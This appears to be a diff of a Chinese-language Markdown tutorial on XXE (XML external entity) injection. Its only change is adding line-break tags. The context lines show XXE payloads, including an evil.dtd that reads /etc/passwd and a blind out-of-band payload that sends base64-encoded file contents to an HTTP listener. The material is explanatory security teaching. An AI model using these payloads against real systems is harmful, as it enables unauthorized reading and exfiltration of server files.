@@ -10,7 +10,7 @@ XXE漏洞也叫XML外部实体注入。由于没有禁止外部实体的加载,�
 ## XXE漏洞的利用
 一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。
 ### （一）有回显的情况
-**（1）直接通过DTD外部实体声明**
+**（1）直接通过DTD外部实体声明**</br>
 XML内容如下：
 ```
 <?xml version="1.0"?>
@@ -19,7 +19,7 @@ XML内容如下：
 ]>
 <abc>&test;</abc>
 ```
-**（2）通过DTD文档引入外部DTD文档，再引入外部实体声明**
+**（2）通过DTD文档引入外部DTD文档，再引入外部实体声明**</br>
 XML内容如下：
 ```
 <?xml version="1.0"?>
@@ -28,7 +28,7 @@ XML内容如下：
 evil.dtd内容：
 <!ENTITY b SYSTEM "file:///etc/passwd">
 ```
-**（3）通过DTD外部实体声明引入外部实体声明**
+**（3）通过DTD外部实体声明引入外部实体声明**</br>
 XML内容如下:
 ```
 <?xml version="1.0"?>
@@ -76,7 +76,7 @@ evil.dtd内容：
 <!ENTITY % payload "<!ENTITY % send SYSTEM 'http://localhost/?content=%file;'>"> %payload;
 ```
 调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</br>
-这里注意参数实体引用%file;必须放在外部文件里，因为根据这条规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。
+这里注意参数实体引用%file;必须放在外部文件里，因为根据这条规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。</br>
 一般都使用第二种方法，因为当文件中含有中文字符或<字符，会导致不能解析。
 
 ## XXE漏洞的防御
